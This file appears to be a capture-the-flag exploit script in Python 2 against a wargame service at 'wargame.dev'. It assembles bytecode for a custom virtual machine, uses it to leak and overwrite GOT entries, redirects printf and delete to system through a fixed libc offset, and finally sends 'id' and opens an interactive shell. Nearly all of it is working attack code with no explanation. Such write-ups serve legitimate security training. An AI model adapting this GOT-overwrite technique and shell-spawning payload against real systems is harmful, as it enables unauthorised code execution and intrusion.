from socket import *
from struct import *
import telnetlib


PH = lambda x: pack('<H', x)


def rd(t):
    r = ''
    while t not in r:
        c = s.recv(1)
        if not c:
            break

        r += c

    return r


def mov4(r1, r2):
    r = chr(0)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        if 'r' not in str(r2).lower():
            r += chr((r1 << 3) | 1)
        else:
            r += chr(r1 << 3)
    else:
        print 'unknown identify register'
        exit(0)

    if 'r' in str(r2).lower():
        r2 = int(r2[1:])
        r += PH(r2 << 3)
    else:
        r += PH(r2)
    return r


def sub4(r1, r2):
    r = chr(2)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        if 'r' not in str(r2).lower():
            r += chr((r1 << 3) | 1)
        else:
            r += chr(r1 << 3)
    else:
        print 'unknown identify register'
        exit(0)

    if 'r' in str(r2).lower():
        r2 = int(r2[1:])
        r += PH(r2 << 3)
    else:
        r += PH(r2)
    return r


def add4(r1, r2):
    r = chr(1)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        if 'r' not in str(r2).lower():
            r += chr((r1 << 3) | 1)
        else:
            r += chr(r1 << 3)
    else:
        print 'unknown identify register'
        exit(0)

    if 'r' in str(r2).lower():
        r2 = int(r2[1:])
        r += PH(r2 << 3)
    else:
        r += PH(r2)
    return r

def shr4(r1, r2):
    r = chr(4)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        if 'r' not in str(r2).lower():
            r += chr((r1 << 3) | 1)
        else:
            r += chr(r1 << 3)
    else:
        print 'unknown identify register'
        exit(0)

    if 'r' in str(r2).lower():
        r2 = int(r2[1:])
        r += PH(r2 << 3)
    else:
        r += PH(r2)
    return r

def nop():
    return chr(9)

def branch(r1):
    r = chr(6)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        r += chr(r1 << 3)

    else:
        print 'unknown identify register'
        exit(0)
    return r

def shl4(r1, r2):
    r = chr(3)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        if 'r' not in str(r2).lower():
            r += chr((r1 << 3) | 1)
        else:
            r += chr(r1 << 3)
    else:
        print 'unknown identify register'
        exit(0)

    if 'r' in str(r2).lower():
        r2 = int(r2[1:])
        r += PH(r2 << 3)
    else:
        r += PH(r2)
    return r

def ldr4(r1, r2):
    r = chr(5)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        r += chr(r1 << 3)
    else:
        print 'unknown identify register'
        exit(0)

    if 'r' in str(r2).lower():
        r2 = int(r2[1:])
        r += PH(r2 << 3)
    else:
        print 'unknown identify register'
        exit(0)
    return r


def str4(r1, r2):
    r = chr(7)
    if 'r' in str(r1).lower():
        r1 = int(r1[1:])
        r += chr(r1 << 3)
    else:
        print 'unknown identify register'
        exit(0)

    if 'r' in str(r2).lower():
        r2 = int(r2[1:])
        r += PH(r2 << 3)
    else:
        print 'unknown identify register'
        exit(0)
    return r


if __name__ == '__main__':
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('wargame.dev', 9002))

    printf_got = 0x607020
    delete_got = 0x607030

    printf_system_offset = 0x10470

    #reg4
    code = ''
    code += mov4('r0', 0x6873)
    code += str4('r1', 'r0')
    code += mov4('r0', printf_got & 0xffff)
    code += mov4('r3', 0xff00)
    code += str4('r3', 'r0')
    code += mov4('r0', (printf_got >> 16) & 0xffff)
    code += mov4('r3', 0xff02)
    code += str4('r3', 'r0')

    code += mov4('r0', (printf_got + 0x10) & 0xffff)
    code += mov4('r3', 0xff08)
    code += str4('r3', 'r0')
    code += mov4('r0', ((printf_got + 0x10) >> 16) & 0xffff)
    code += mov4('r3', 0xff0a)
    code += str4('r3', 'r0')

    code += mov4('r0', (printf_got + 0x10) & 0xffff)
    code += mov4('r3', 0xff10)
    code += str4('r3', 'r0')
    code += mov4('r0', ((printf_got + 0x10) >> 16) & 0xffff)
    code += mov4('r3', 0xff12)
    code += str4('r3', 'r0')

    code += mov4('r0', 0xffff)
    code += ldr4('r3', 'r0')
    code += shr4('r3', 8)
    code += sub4('r3', 0x130)
    code += shl4('r3', 8)
    code += str4('r0', 'r3')
    code += mov4('r0', len(code) + 7)
    code += branch('r0') #switch reg2
    code += nop()
    #reg2
    code += mov4('r3', 0x40)
    code += str4('r3', 'r0')
    code += add4('r3', 2)
    code += str4('r3', 'r1')
    code += add4('r3', 2)
    code += str4('r3', 'r2')

    code += mov4('r0', len(code) + 7)
    code += branch('r0')  # switch reg4
    code += nop()

    #reg4
    code += mov4('r0', 0x40)
    code += ldr4('r2', 'r0')
    code += sub4('r2', printf_system_offset & 0xffff)
    code += str4('r0', 'r2')

    code += mov4('r0', 0x42)
    code += ldr4('r2', 'r0')
    code += sub4('r2', printf_system_offset >> 16)
    code += str4('r0', 'r2')

    code += mov4('r0', delete_got & 0xffff)
    code += mov4('r3', 0xff00)
    code += str4('r3', 'r0')
    code += mov4('r0', (delete_got >> 16) & 0xffff)
    code += mov4('r3', 0xff02)
    code += str4('r3', 'r0')

    code += mov4('r0', (delete_got + 0x10) & 0xffff)
    code += mov4('r3', 0xff08)
    code += str4('r3', 'r0')
    code += mov4('r0', ((delete_got + 0x10) >> 16) & 0xffff)
    code += mov4('r3', 0xff0a)
    code += str4('r3', 'r0')

    code += mov4('r0', (delete_got + 0x10) & 0xffff)
    code += mov4('r3', 0xff10)
    code += str4('r3', 'r0')
    code += mov4('r0', ((delete_got + 0x10) >> 16) & 0xffff)
    code += mov4('r3', 0xff12)
    code += str4('r3', 'r0')

    code += mov4('r0', len(code) + 7)
    code += branch('r0')  # switch reg2
    code += nop()

    #reg2
    code += mov4('r3', 0x40)
    code += ldr4('r0', 'r3')
    code += add4('r3', 2)
    code += ldr4('r1', 'r3')
    code += add4('r3', 2)
    code += ldr4('r2', 'r3')
    code += mov4('r3', 0x00)
    code += chr(11) # return

    rd('> ')
    s.send('%d\n' % len(code))
    rd('> ')
    s.send('%s\n' % code)

    s.send('id\n')

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
